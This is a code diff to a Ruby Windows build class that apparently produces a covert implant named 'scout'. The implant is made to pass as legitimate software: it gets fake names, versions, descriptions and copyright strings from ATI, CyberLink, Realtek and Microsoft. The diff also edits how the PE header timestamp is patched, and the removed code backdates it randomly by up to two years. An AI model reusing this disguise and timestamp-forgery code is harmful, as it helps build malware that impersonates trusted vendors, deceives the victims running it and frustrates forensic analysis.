@@ -107,7 +107,6 @@ class BuildWindows < Build
     end
 
     # patching the build time
-    patch_build_time('scout')
     patch_build_time('core')
     patch_build_time('core64')
     patch_build_time('codec')
@@ -238,7 +237,7 @@ class BuildWindows < Build
   end
 
   def scout_name(seed)
-    scout_names = [{name: 'CCC', version: '3.5.0.5', desc: 'Catalys Control Center: Host application',company: 'ATI Technologies Inc.', copyright: '2002-2010'},
+    scout_names = [{name: 'CCC', version: '3.5.0.5', desc: 'Catalyst Control Center: Host application',company: 'ATI Technologies Inc.', copyright: '2002-2010'},
                    {name: 'PDVD9Serv', version: '9.0.3401.1', desc: 'PowerDVD RC Service', company: 'CyberLink Corp.', copyright: 'Copyright (c) CyberLink Corp. 1997-2008'},
                    {name: 'RtDCpl', version: '1.0.0.12', desc: 'HD Audio Control Panel', company: 'Realtek Semiconductor Corp.', copyright: 'Copyright 2010 (c) Realtek Semiconductor Corp.. All rights reserved.'},
                    {name: 'sllauncher', version: '5.1.10411.3', desc: 'Microsoft Silverlight Out-of-Browser Launcher', company: 'Microsoft Silverlight', copyright: 'Copyright (c) Microsoft Corporation.All rights reserved.'},
@@ -454,8 +453,7 @@ class BuildWindows < Build
       begin
         offset = content.index("PE\x00\x00")
         raise if offset.nil?
-        # random time is NOW - rand(two year) (3600*24*365*2 -> 63072000)
-        time = Time.now.to_i + rand(-63072000..0)
+        time = Time.now.to_i
         content.binary_patch_at_offset offset + 8, [time].pack('I')
       rescue
         raise "build time offset not found"
